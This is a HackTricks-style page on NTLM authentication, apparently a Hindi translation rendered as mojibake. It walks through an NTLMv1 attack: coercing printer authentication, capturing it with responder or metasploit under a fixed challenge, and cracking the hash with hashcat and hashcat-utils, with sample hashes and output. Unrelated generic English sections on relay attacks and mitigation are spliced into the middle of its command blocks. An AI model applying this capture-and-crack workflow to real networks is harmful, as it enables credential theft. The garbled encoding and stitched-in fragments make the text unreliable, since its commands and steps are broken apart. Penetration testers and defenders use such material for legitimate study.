# NTLM

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ред
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **ЁЯРж**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**hacktricks рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ**ред

</details>

## рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА

**NTLM Credentials**: рдбреЛрдореЗрди рдирд╛рдо (рдпрджрд┐ рдХреЛрдИ рд╣реИ), рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рд╣реИрд╢ред

**LM** рдХреЗрд╡рд▓ **Windows XP рдФрд░ рд╕рд░реНрд╡рд░ 2003** рдореЗрдВ **рд╕рдХреНрд╖рдо** рд╣реИ (LM рд╣реИрд╢ рдХреЛ рдХреНрд░реИрдХ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ)ред LM рд╣реИрд╢ AAD3B435B51404EEAAD3B435B51404EE рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ LM рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рд╣реЛ рд░рд╣рд╛ рд╣реИ (рдЦрд╛рд▓реА рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХрд╛ LM рд╣реИрд╢ рд╣реИ)ред

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ **Kerberos** рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реЛрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП NTLM рдХрд╛ рдЙрдкрдпреЛрдЧ рдХреЗрд╡рд▓ рддрдм рд╣реЛрдЧрд╛ рдЬрдм **рдХреЛрдИ Active Directory рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдирд╣реАрдВ рд╣реИ**, **рдбреЛрдореЗрди рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ**, **Kerberos рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд░рд╣рд╛ рд╣реИ** (рдмреБрд░реА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди) рдпрд╛ **рд╡рд╛рд▓рд┐рдб рд╣реЛрд╕реНрдЯ-рдирд╛рдо рдХреА рдмрдЬрд╛рдп IP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдХреНрд▓рд╛рдЗрдВрдЯ** рдХреЛрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИред

**NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг** рдХреЗ **рдиреЗрдЯрд╡рд░реНрдХ рдкреИрдХреЗрдЯ** рдХреЗ **рд╣реЗрдбрд░** рдореЗрдВ "**NTLMSSP**" рд╣реЛрддрд╛ рд╣реИред

рдкреНрд░реЛрдЯреЛрдХреЙрд▓: LM, NTLMv1 рдФрд░ NTLMv2 рдХреЛ DLL %windir%\Windows\System32\msv1\_0.dll рдореЗрдВ рд╕рдорд░реНрдерд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

## LM, NTLMv1 рдФрд░ NTLMv2

рдЖрдк рдЬрд╛рдВрдЪ рдФрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреМрди рд╕рд╛ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛:

### GUI

_secpol.msc_ рдЪрд▓рд╛рдПрдВ -> рд╕реНрдерд╛рдиреАрдп рдиреАрддрд┐рдпрд╛рдБ -> рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рдХрд▓реНрдк -> рдиреЗрдЯрд╡рд░реНрдХ рд╕реБрд░рдХреНрд╖рд╛: LAN рдкреНрд░рдмрдВрдзрди рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕реНрддрд░ред 6 рд╕реНрддрд░ рд╣реИрдВ (0 рд╕реЗ 5 рддрдХ)ред

![](<../../.gitbook/assets/image (92).png>)

### рд░рдЬрд┐рд╕реНрдЯреНрд░реА

рдпрд╣ рд╕реНрддрд░ 5 рд╕реЗрдЯ рдХрд░реЗрдЧрд╛:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
рд╕рдВрднрд╛рд╡рд┐рдд рдорд╛рди:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## рдмреЗрд╕рд┐рдХ NTLM рдбреЛрдореЗрди рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдпреЛрдЬрдирд╛

1. **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдЕрдкрдиреЗ **рдкреНрд░рдорд╛рдгрдкрддреНрд░** рдкреНрд░рд╕реНрддреБрдд рдХрд░рддрд╛ рд╣реИ
2. рдХреНрд▓рд╛рдЗрдВрдЯ рдорд╢реАрди **рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЕрдиреБрд░реЛрдз рднреЗрдЬрддреА рд╣реИ** рдЬрд┐рд╕рдореЗрдВ **рдбреЛрдореЗрди рдирд╛рдо** рдФрд░ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо** рднреЗрдЬрддреА рд╣реИ
3. **рд╕рд░реНрд╡рд░** **рдЪреБрдиреМрддреА** рднреЗрдЬрддрд╛ рд╣реИ
4. **рдХреНрд▓рд╛рдЗрдВрдЯ** рдЪреБрдиреМрддреА рдХреЛ **рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд╣реИрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ** рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рднреЗрдЬрддрд╛ рд╣реИ
5. **рд╕рд░реНрд╡рд░** **рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░** рдХреЛ **рдбреЛрдореЗрди рдирд╛рдо, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо, рдЪреБрдиреМрддреА рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рднреЗрдЬрддрд╛ рд╣реИред рдпрджрд┐ **рд╕рдХреНрд░рд┐рдп рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛** рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдирд╣реАрдВ рд╣реИ рдпрд╛ рдбреЛрдореЗрди рдирд╛рдо рд╕рд░реНрд╡рд░ рдХрд╛ рдирд╛рдо рд╣реИ, рддреЛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ **рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рдЬрд╛рдВрдЪреА рдЬрд╛рддреА рд╣реИ**ред
6. **рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░** рдЬрд╛рдВрдЪрддрд╛ рд╣реИ рдХрд┐ рд╕рдм рдХреБрдЫ рд╕рд╣реА рд╣реИ рдФрд░ рд╕рд░реНрд╡рд░ рдХреЛ рдЬрд╛рдирдХрд╛рд░реА рднреЗрдЬрддрд╛ рд╣реИ

**рд╕рд░реНрд╡рд░** рдФрд░ **рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░** рдХреЛ **рдиреЗрдЯрд▓реЙрдЧрди** рд╕рд░реНрд╡рд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **рд╕реБрд░рдХреНрд╖рд┐рдд рдЪреИрдирд▓** рдмрдирд╛рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рд╕рд░реНрд╡рд░ рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рдЬрд╛рдирддрд╛ рд╣реИ (рдпрд╣ **NTDS.DIT** рдбреЗрдЯрд╛рдмреЗрд╕ рдореЗрдВ рд╣реИ)ред

### рд╕реНрдерд╛рдиреАрдп NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдпреЛрдЬрдирд╛

рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЙрд╕реА рддрд░рд╣ рд╣реИ рдЬреИрд╕рд╛ **рдкрд╣рд▓реЗ рдЙрд▓реНрд▓рд┐рдЦрд┐рдд** рд╣реИ, рд▓реЗрдХрд┐рди **рд╕рд░реНрд╡рд░** рдЙрд╕ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╣реИрд╢ рдХреЛ рдЬрд╛рдирддрд╛ рд╣реИ** рдЬреЛ **SAM** рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд░рд╣рд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП, рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рд╕реЗ рдкреВрдЫрдиреЗ рдХреА рдмрдЬрд╛рдп, **рд╕рд░реНрд╡рд░ рдЦреБрдж рдЬрд╛рдВрдЪреЗрдЧрд╛** рдХрд┐ рдХреНрдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░ рд╕рдХрддрд╛ рд╣реИред

### NTLMv1 рдЪреБрдиреМрддреА

**рдЪреБрдиреМрддреА рд▓рдВрдмрд╛рдИ 8 рдмрд╛рдЗрдЯ** рд╣реИ рдФрд░ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ 24 рдмрд╛рдЗрдЯ** рд▓рдВрдмреА рд╣реИред

**рд╣реИрд╢ NT (16 рдмрд╛рдЗрдЯ)** рдХреЛ **3 рд╣рд┐рд╕реНрд╕реЛрдВ рдореЗрдВ рд╡рд┐рднрд╛рдЬрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдкреНрд░рддреНрдпреЗрдХ 7 рдмрд╛рдЗрдЯ)**: **рдЖрдЦрд┐рд░реА рд╣рд┐рд╕реНрд╕рд╛ рд╢реВрдиреНрдпреЛрдВ рд╕реЗ рднрд░рд╛ рд╣реЛрддрд╛ рд╣реИ**ред рдлрд┐рд░, **рдЪреБрдиреМрддреА** рдХреЛ рдкреНрд░рддреНрдпреЗрдХ рд╣рд┐рд╕реНрд╕реЗ рдХреЗ рд╕рд╛рде рдЕрд▓рдЧ-рдЕрд▓рдЧ **рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдкрд░рд┐рдгрд╛рдореА рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдмрд╛рдЗрдЯреНрд╕ **рдЬреЛрдбрд╝реЗ рдЬрд╛рддреЗ рд╣реИрдВ**ред рдХреБрд▓: 8 рдмрд╛рдЗрдЯ + 8 рдмрд╛рдЗрдЯ + 8 рдмрд╛рдЗрдЯ = 24 рдмрд╛рдЗрдЯред

**рд╕рдорд╕реНрдпрд╛рдПрдВ**:

* **рдЕрдирд┐рдпрдорд┐рддрддрд╛ рдХреА рдХрдореА**
* 3 рд╣рд┐рд╕реНрд╕реЗ рдЕрд▓рдЧ-рдЕрд▓рдЧ **рд╣рдорд▓реЗ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ** рддрд╛рдХрд┐ NT рд╣реИрд╢ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗ
* **DES рдХреЛ рддреЛрдбрд╝рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**
* 3 рд╡рд╛рдВ рдХреБрдВрдЬреА рд╣рдореЗрд╢рд╛ **5 рд╢реВрдиреНрдпреЛрдВ** рд╕реЗ рдорд┐рд▓рдХрд░ рдмрдирд╛рдИ рдЬрд╛рддреА рд╣реИред
* **рдПрдХ рд╣реА рдЪреБрдиреМрддреА** рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рддреЛ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** **рд╕рдорд╛рди** рд╣реЛрдЧреАред рдЗрд╕рд▓рд┐рдП, рдЖрдк рдкреАрдбрд╝рд┐рдд рдХреЛ **рдкреВрд░реНрд╡-рдЧрдгрдирд╛ рд░реЗрдирдмреЛ рддрд╛рд▓рд┐рдХрд╛рдУрдВ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЗ рд▓рд┐рдП "**1122334455667788**" рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рдЪреБрдиреМрддреА рджреЗ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╣рдорд▓рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### NTLMv1 рд╣рдорд▓рд╛

рдЖрдЬрдХрд▓ рдЕрдирдХрдВрд╢рд┐рдд рдбреЗрд▓реАрдЧреЗрд╢рди рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рдкрд░рд┐рд╡реЗрд╢реЛрдВ рдХреЛ рдвреВрдВрдврдирд╛ рдХрдо рд╣реЛ рд░рд╣рд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рдпрд╣ рдирд╣реАрдВ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЖрдк **рдкреНрд░рд┐рдВрдЯ рд╕реНрдкреВрд▓рд░ рд╕реЗрд╡рд╛** рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗред

рдЖрдк AD рдкрд░ рдкрд╣рд▓реЗ рд╕реЗ рдХреБрдЫ рдкреНрд░рдорд╛рдгрдкрддреНрд░/рд╕рддреНрд░реЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдкреНрд░рд┐рдВрдЯрд░ рд╕реЗ рдЕрдиреБрд░реЛрдз рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдХрд┐ рд╡рд╣ рдЖрдкрдХреЗ рдирд┐рдпрдВрддреНрд░рдг рдХреЗ рддрд╣рдд рдХрд┐рд╕реА **рд╣реЛрд╕реНрдЯ рдХреЗ рдЦрд┐рд▓рд╛рдл рдкреНрд░рдорд╛рдгреАрдХрд░рдг** рдХрд░реЗрдВред рдлрд┐рд░, `metasploit auxiliary/server/capture/smb` рдпрд╛ `responder` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк **рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЪреБрдиреМрддреА рдХреЛ 1122334455667788** рд╕реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рдпрд╛рд╕ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдпрджрд┐ рдпрд╣ **NTLMv1** рдХреЗ рдЙрдкрдпреЛрдЧ рд╕реЗ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рддреЛ рдЖрдк рдЗрд╕реЗ **рддреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ**ред\
рдпрджрд┐ рдЖрдк `responder` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рддреЛ рдЖрдк \*\*рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕ рддрдХрдиреАрдХ рдХреЗ рд▓рд┐рдП рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ NTLMv1 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП (NTLMv2 рдорд╛рдиреНрдп рдирд╣реАрдВ рд╣реИ)ред_

рдзреНрдпрд╛рди рд░рдЦреЗрдВ рдХрд┐ рдкреНрд░рд┐рдВрдЯрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рджреМрд░рд╛рди рдХрдВрдкреНрдпреВрдЯрд░ рдЦрд╛рддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛, рдФрд░ рдХрдВрдкреНрдпреВрдЯрд░ рдЦрд╛рддреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ **рд▓рдВрдмрд╛ рдФрд░ рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рдкрд╛рд╕рд╡рд░реНрдб** рдХрд░рддреЗ рд╣реИрдВ рдЬрд┐рд╕реЗ рдЖрдк **рд╕рд╛рдорд╛рдиреНрдп рд╢рдмреНрджрдХреЛрд╢** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рддреЛрдбрд╝рдиреЗ** рдХреЗ рд▓рд┐рдП **рд╕рдВрднрд╛рд╡рдирд╛ рдирд╣реАрдВ рд╣реИ**ред рд▓реЗрдХрд┐рди **NTLMv1** рдкреНрд░рдорд╛рдгреАрдХрд░рдг **DES рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ** ([рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдпрд╣рд╛рдБ](./#ntlmv1-challenge)), рдЗрд╕рд▓рд┐рдП рдХреБрдЫ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ DES рдХреЛ рддреЛрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдЗрд╕реЗ рддреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ (рдЖрдк [https://crack.sh/](https://crack.sh) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)ред

### hashcat рдХреЗ рд╕рд╛рде NTLMv1 рд╣рдорд▓рд╛

NTLMv1 рдХреЛ NTLMv1 рдорд▓реНрдЯреА рдЯреВрд▓ [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) рдХреЗ рд╕рд╛рде рддреЛрдбрд╝рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ NTLMv1 рд╕рдВрджреЗрд╢реЛрдВ рдХреЛ рдПрдХ рдРрд╕реА рд╡рд┐рдзрд┐ рдореЗрдВ рд╕реНрд╡рд░реВрдкрд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ hashcat рдХреЗ рд╕рд╛рде рддреЛрдбрд╝рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЖрдЬреНрдЮрд╛
```
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
## NTLM Relay Attack

### Introduction

In an NTLM relay attack, an attacker intercepts the NTLM authentication traffic between a client and a server, and relays it to another server to authenticate as the original client. This attack can be used to gain unauthorized access to systems and resources.

### Steps to Perform NTLM Relay Attack

1. **Set Up a Rogue Server**: The attacker sets up a rogue server to intercept NTLM authentication requests from the client.
   
2. **Capture NTLM Authentication Traffic**: The rogue server captures the NTLM authentication traffic between the client and the legitimate server.
   
3. **Relay the Authentication**: The attacker relays the captured authentication traffic to another server to authenticate as the client.
   
4. **Gain Unauthorized Access**: By successfully relaying the authentication, the attacker gains unauthorized access to the target system or resource.

### Mitigation Techniques

To prevent NTLM relay attacks, consider implementing the following mitigation techniques:

- **Enforce SMB Signing**: Enabling SMB signing can help prevent NTLM relay attacks by ensuring the integrity of the SMB packets.
  
- **Use Extended Protection for Authentication**: Implement Extended Protection for Authentication to protect against NTLM relay attacks.
  
- **Disable NTLM**: Consider disabling NTLM authentication in favor of more secure authentication protocols like Kerberos.

By implementing these mitigation techniques, organizations can reduce the risk of falling victim to NTLM relay attacks.
```
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
# NTLM Relay Attack

## Introduction

NTLM relay attacks are a common technique used by attackers to escalate privileges in a Windows environment. This attack involves intercepting NTLM authentication traffic and relaying it to other systems to gain unauthorized access.

## How it works

1. The attacker intercepts NTLM authentication traffic between a client and a server.
2. The attacker relays this traffic to another system, such as a file server or domain controller.
3. The target system processes the authentication request, believing it is coming from the original client.
4. If successful, the attacker gains unauthorized access to the target system using the compromised credentials.

## Mitigation

To mitigate NTLM relay attacks, consider implementing the following measures:

- Disable NTLM authentication in favor of more secure protocols like Kerberos.
- Enable SMB signing to prevent tampering with authentication traffic.
- Implement network segmentation to limit the scope of potential relay attacks.
- Regularly monitor and analyze network traffic for suspicious activity.

By following these best practices, organizations can reduce the risk of falling victim to NTLM relay attacks.
```
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
рдЕрдЧрд░ рдЖрдкрдХреЗ рдкрд╛рд╕ рд╣реИрд╢рдЯреЛрдкреЛрд▓рд┐рд╕ рдЬреИрд╕реЗ рдЯреВрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╡рд┐рддрд░рд┐рдд рд╣реИрд╢рдХреИрдЯ рдХреЛ рдЪрд▓рд╛рдПрдВ, рдпрд╣ рдЕрдиреНрдпрдерд╛ рдХрдИ рджрд┐рди рд▓реЗ рд╕рдХрддрд╛ рд╣реИред
```
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рд╣рдореЗрдВ рдЗрд╕рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдкрддрд╛ рд╣реИ рдХрд┐ 'password' рд╣реИ, рдЗрд╕рд▓рд┐рдП рд╣рдо рдбреЗрдореЛ рдХреЗ рдЙрджреНрджреЗрд╢реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рдзреЛрдЦрд╛ рджреЗрдВрдЧреЗ:
```
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
рд╣рдореЗрдВ рдЕрдм hashcat-utilities рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рддрд╛рдХрд┐ рдХреНрд░реИрдХ рдХрд┐рдП рдЧрдП des рдХреБрдВрдЬреА рдХреЛ NTLM рд╣реИрд╢ рдХреЗ рд╣рд┐рд╕реНрд╕реЛрдВ рдореЗрдВ рдмрджрд▓рд╛ рдЬрд╛ рд╕рдХреЗ:
```
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
## NTLM

### Overview

NTLM (NT LAN Manager) is a suite of Microsoft security protocols that provides authentication, integrity, and confidentiality to users. It is commonly used for authentication in Windows environments.

### NTLM Relay Attack

NTLM relay attack is a type of attack where an attacker captures the NTLM authentication request sent by a victim and relays it to a target server to gain unauthorized access. This attack can be mitigated by implementing security measures such as SMB signing, Extended Protection for Authentication, and LDAP signing.

### Protection

To protect against NTLM relay attacks, it is recommended to disable NTLM authentication in favor of more secure protocols like Kerberos. Additionally, enabling SMB signing, Extended Protection for Authentication, and LDAP signing can help prevent these attacks.
```
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
## NTLM

### Overview

NTLM (NT LAN Manager) is a suite of Microsoft security protocols that provides authentication, integrity, and confidentiality to users. It is commonly used in Windows environments for authentication purposes.

### NTLM Hashes

NTLM hashes are generated by hashing the user's password. These hashes can be used in various hacking techniques, such as pass-the-hash attacks, to gain unauthorized access to systems.

### Protecting Against NTLM Attacks

To protect against NTLM attacks, it is recommended to use stronger authentication methods such as Kerberos, enable SMB signing, and disable the use of NTLM where possible. Additionally, regularly changing passwords and monitoring for any suspicious activity can help mitigate the risk of NTLM attacks.
```
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**рдЪреБрдиреМрддреА рдХреА рд▓рдВрдмрд╛рдИ 8 рдмрд╛рдЗрдЯ рд╣реИ** рдФрд░ **2 рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ рднреЗрдЬреА рдЬрд╛рддреА рд╣реИрдВ**: рдПрдХ **24 рдмрд╛рдЗрдЯ** рд▓рдВрдмреА рд╣реИ рдФрд░ **рджреВрд╕рд░реА** рдХреА рд▓рдВрдмрд╛рдИ **рд╡рд┐рд╡рд┐рдз** рд╣реИред

